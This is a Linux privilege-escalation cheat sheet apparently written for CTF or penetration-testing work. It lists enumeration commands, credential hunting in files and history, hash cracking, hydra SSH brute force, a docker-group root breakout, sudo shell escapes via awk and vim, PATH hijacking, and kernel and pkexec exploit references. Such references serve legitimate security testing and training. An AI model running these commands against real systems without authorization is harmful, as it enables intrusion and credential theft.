# Linux Privilege Escalation Checklist & Commands

## 🎯 What am I realistically expecting to find here?

⭐ After landing a low-privilege shell, I’m hunting for:


- [ ] Quick wins like sudo permissions, password reuse, writable PATH  
- [ ] Hardcoded passwords or reused credentials for other users  
- [ ] SUID/SGID binaries to exploit  
- [ ] Cron jobs or systemd timers I can hijack  
- [ ] Misconfigured services or writable configs  
- [ ] Sensitive info in config or backup files  
- [ ] Exploitable kernel or software versions  
- [ ] Passwords in scripts, databases, or kdbx/keepass files  
- [ ] SSH keys, authorized_keys, or .bash_history  
- [ ] Abusable capabilities (setcap)  
- [ ] Processes running as root or with high privileges  
- [ ] Commands run by root automatically (pspy, cron, etc.)  
- [ ] Local services or apps I can abuse  
- [ ] Potential for local port forwarding or Docker group abuse  
- [ ] Full enumeration with linpeas.sh, les.sh, etc.  
- [ ] Anything that lets me escalate to root  
- [ ] Is there any interesting group?  
- [ ] Any exploitable sudo rules (NOPASSWD, SETENV, etc.)  
- [ ] Dangerous binaries in sudo or with SUID + GTFOBins  
- [ ] Writable or hijackable services, timers, or .socket files  
- [ ] Writable LD configs or preload libraries  
- [ ] Polkit or pkexec exploitation  
- [ ] /etc/passwd or shadow write access  
- [ ] Open sessions, hijackable tmux/screen  
- [ ] Interesting logs or credential leftovers  
- [ ] Misconfigured NFS, LUKS, mountable drives  
- [ ] LXD breakout with container injection  
- [ ] Misconfigured AppArmor or SELinux profiles  
- [ ] Exposed .plan or .rhosts files  
- [ ] Misconfigured PAM or sudoers.d rules  
- [ ] Unquoted service paths (rare in Linux)  
- [ ] CVE-specific public exploits for distro version  
- [ ] Mount points with nosuid/noexec bypass opportunities  
- [ ] Files owned by root but writable  
- [ ] Core dumps or swap files containing secrets  
- [ ] Environment variables with credentials  
- [ ] Misconfigured rsync/backup daemons  
- [ ] SSH Agent forwarding abuse  
- [ ] SSH config hijack (`ProxyCommand`, `Match User`)  
- [ ] User switching paths like `su`, `newgrp`, or broken RBAC  

---

## ✅ Initial Enumeration

- Who am I?
  ```bash
  id; whoami; hostname
  ```

- System Info:
  ```bash
  uname -a; cat /etc/*release
  lsb_release -a 2>/dev/null
  ```

- Kernel version (for exploits):
  ```bash
  uname -r
  searchsploit <version>
  ```

---

## ✅ Quick Wins

- Sudo permissions
  ```bash
  sudo -l
  ```

- PATH abuse
  ```bash
  echo $PATH
  find . -writable 2>/dev/null
  ls -la /usr/local/bin
  ```

- Passwords in history, configs
  ```bash
  grep -Ri password /etc/* /home/* 2>/dev/null
  cat ~/.bash_history
  ```

- SSH reuse / authorized keys
  ```bash
  ls -la /home/*/.ssh/
  cat /home/*/.ssh/authorized_keys
  ```

- Writable bashrc/profile files (other users)
  ```bash
  find /home -name ".bashrc" -writable 2>/dev/null
  ```

---

## ✅ Password Reuse or Easy Guesses

- Try using the username as password  
- Test known passwords on other users  
- Password reuse across services  
- Try default creds: `root:toor`, `admin:admin`  
- Test passwords found in scripts/configs on SSH  

---

## ✅ Password Discovery

- Search for passwords in files
  ```bash
  grep -Ri password /etc/* /home/*
  find / -type f \( -iname "*pass*" -o -iname "*cred*" -o -iname "*.kdbx" \) 2>/dev/null
  ```

- Crack password hashes
  ```bash
  john --wordlist=rockyou.txt hashes.txt
  hashcat ...
  ```

- SSH bruteforce if necessary
  ```bash
  hydra -l user -P rockyou.txt ssh://target
  ```

---

## ✅ Writable Files & Folders

- Search for world-writable files
  ```bash
  find / -type f -perm -2 2>/dev/null
  ```

- Search for world-writable directories
  ```bash
  find / -type d -perm -2 2>/dev/null
  ```

- Check if any service scripts are writable

---

## ✅ PATH Abuses

- Check $PATH for writable directories
  ```bash
  echo $PATH
  ls -la /usr/local/bin
  ```

---

## ✅ SUID / SGID Binaries

- Find them:
  ```bash
  find / -perm -4000 2>/dev/null
  find / -perm -2000 2>/dev/null
  ```

- Check GTFOBins:  
  https://gtfobins.github.io/

---

## ✅ Cron Jobs & Timers

- Cron enumeration:
  ```bash
  crontab -l
  ls -la /etc/cron*
  cat /etc/crontab
  ```

- Timers:
  ```bash
  systemctl list-timers --all
  ```

- Monitor:
  ```bash
  ./pspy64
  ```

---

## ✅ Services, Systemd, and Sockets

- Writable service configs or binaries  
- Hijackable ExecStart paths  

- Relative path abuse in services:
  ```bash
  systemctl show-environment
  ```

- Writable .service, .socket, or .timer files:
  ```bash
  find /etc/systemd/ -writable 2>/dev/null
  ```

---

## ✅ Services & Network

- List open ports and services
  ```bash
  ss -tulwn
  netstat -tulnp
  ```

- Check for local websites
  ```bash
  curl localhost
  ```

- Check for config files of web servers
  ```bash
  cat /etc/nginx/nginx.conf
  cat /etc/apache2/apache2.conf
  ```

- Setup local port forwarding if needed

---

## ✅ Local Services & Admin Panels

- Check for local-only services
  ```bash
  ss -tulwn
  curl localhost:<port>
  nc localhost <port>
  ```

- Check for config files with credentials
  ```bash
  find / -name "*.conf" 2>/dev/null | xargs grep -i "password"
  find / -name "*.env" 2>/dev/null | xargs grep -i "secret"
  ```

---

## ✅ Git & Other VCS Repos

- Look for local .git folders
  ```bash
  find / -type d -name ".git" 2>/dev/null
  ```

- Search git history for secrets
  ```bash
  git log -p
  git grep "password"
  ```

---

## ✅ Sensitive Config & Backup Files

- Look for config files with creds
  ```bash
  find / -type f \( -iname "*.conf" -o -iname "*.bak" -o -iname "*.old" \) 2>/dev/null
  ```

- Look for database creds
  ```bash
  grep -Ri password /var/www
  ```

- Search for KeePass/kdbx files
  ```bash
  find / -iname "*.kdbx" 2>/dev/null
  ```

---

## ✅ Backup & Old Files

- Look for old or rotated backups
  ```bash
  find / -iname "*backup*" -o -iname "*.bak" -o -iname "*.old" 2>/dev/null
  ```

---

## ✅ Docker Breakout

- In docker group?
  ```bash
  id | grep docker
  ```

- Escalate:
  ```bash
  docker run -v /:/host -it ubuntu chroot /host bash
  ```

---

## ✅ Polkit / pkexec

- Check version:
  ```bash
  pkexec --version
  ```

- CVE-2021-4034 (PwnKit) may apply

---

## ✅ Sudo Tricks

- Check for NOPASSWD, SETENV, LD_PRELOAD  
- Abuses:
  ```bash
  sudo -l
  sudo awk 'BEGIN {system("/bin/bash")}'
  sudo vim -c '!sh'
  ```

- Hijack sudo with custom PATH:
  ```bash
  export PATH=/tmp:$PATH
  ```

---

## ✅ Kernel Exploits

- Tools:
  ```bash
  ./linux-exploit-suggester.sh
  ./les.sh
  ```

- DirtyCow (CVE-2016-5195):  
  https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

---

## ✅ Capabilities

- List all:
  ```bash
  getcap -r / 2>/dev/null
  ```

---

## ✅ Monitoring & Memory

- Running processes:
  ```bash
  ps aux | grep root
  ```

- Dump process memory (if root):
  ```bash
  gdb -p <PID>
  mimipenguin
  ```

---

## ✅ Environment Variables

- Check for creds or tokens:
  ```bash
  env
  export -p
  ```

---

## ✅ Users & Groups

- List all users:
  ```bash
  cat /etc/passwd
  ```

- Superusers:
  ```bash
  awk -F: '($3 == 0) {print $1}' /etc/passwd
  ```

- Current user info:
  ```bash
  id; groups
  ```

- Interesting groups:
  - docker  
  - adm  
  - lxd  
  - sudo  
  - video  
  - disk  
  - root  
  - wheel  

---

## ✅ Shared Libraries

- Writable preload config:
  ```bash
  ls -la /etc/ld.so.preload
  ```

- RPATH/RUNPATH misconfigurations:
  ```bash
  readelf -d binary | grep -i path
  ```

```c
NOPASSWD: ALL
sudo -i -u scriptmanager
```

---

## ✅ File & Dir Checks

- Find writable files/folders:
  ```bash
  find / -writable -type f 2>/dev/null
  ```

- Recent changes:
  ```bash
  find / -mmin -5 2>/dev/null
  ```

- Hidden / backup files:
  ```bash
  find / -name ".*" -type f
  find / -iname "*backup*" -o -iname "*.bak"
  ```

---

## ✅ Logs, Bash History & Profiles

- Check:
  ```bash
  cat ~/.bash_history
  ls -la /var/log/
  ```

- Look for:
  - .bashrc  
  - .profile  
  - .plan  
  - .history  
  - .git-credentials  

---

## ✅ Tools to Automate Everything

- linpeas.sh  
- pspy64  
- LES / Linux Exploit Suggester  
- GTFOBins  
- BeRoot  
- FallOfSudo  
- sudo_inject  
- LaZagne (password extraction)  

---

